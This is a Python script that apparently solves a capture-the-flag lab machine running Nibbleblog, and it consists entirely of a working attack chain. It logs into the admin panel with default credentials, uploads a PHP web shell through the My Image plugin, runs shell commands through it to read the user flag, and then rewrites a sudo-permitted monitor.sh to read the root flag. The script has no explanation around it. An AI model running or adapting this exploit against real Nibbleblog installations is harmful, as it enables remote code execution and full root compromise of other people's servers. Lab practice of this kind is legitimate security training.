import requests
import urllib.parse

base_url = "http://10.129.190.191/nibbleblog/"
login_url = base_url + "admin.php?controller=admin&action=login"
upload_url = base_url + "admin.php?controller=plugins&action=config&plugin=my_image"
shell_url = base_url + "content/private/plugins/my_image/image.php"

session = requests.Session()

print("[*] Logging into Nibbleblog admin panel...")
res = session.post(login_url, data={"username": "admin", "password": "nibbles"})
if "admin" not in res.text.lower() and "logout" not in res.text.lower():
    print("[-] Login failed.")
    exit(1)
print("[+] Logged in successfully.")

print("[*] Uploading RCE shell via My Image plugin...")
payload = "<?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?>"
files = {"image": ("image.php", payload, "application/x-php")}
data = {
    "plugin": "my_image",
    "title": "My image",
    "position": "4",
    "caption": "",
    "image_resize": "1",
    "image_width": "230",
    "image_height": "200",
    "image_option": "auto"
}
session.post(upload_url, data=data, files=files)

def run_cmd(cmd):
    encoded_cmd = urllib.parse.quote(cmd)
    r = requests.get(f"{shell_url}?cmd={encoded_cmd}")
    return r.text

print("[*] Fetching user.txt flag...")
user_flag = run_cmd("cat /home/nibbler/user.txt")
print(f"\n[+] user.txt flag:\n{user_flag.strip()}\n")

print("[*] Unzipping personal.zip and exploiting monitor.sh...")
run_cmd("unzip -o /home/nibbler/personal.zip -d /home/nibbler/")
run_cmd("echo '#!/bin/bash' > /home/nibbler/personal/stuff/monitor.sh")
run_cmd("echo 'cat /root/root.txt > /home/nibbler/root_flag.txt' >> /home/nibbler/personal/stuff/monitor.sh")
run_cmd("chmod +x /home/nibbler/personal/stuff/monitor.sh")
run_cmd("sudo /home/nibbler/personal/stuff/monitor.sh")

print("[*] Fetching root.txt flag...")
root_flag = run_cmd("cat /home/nibbler/root_flag.txt")
print(f"\n[+] root.txt flag:\n{root_flag.strip()}\n")
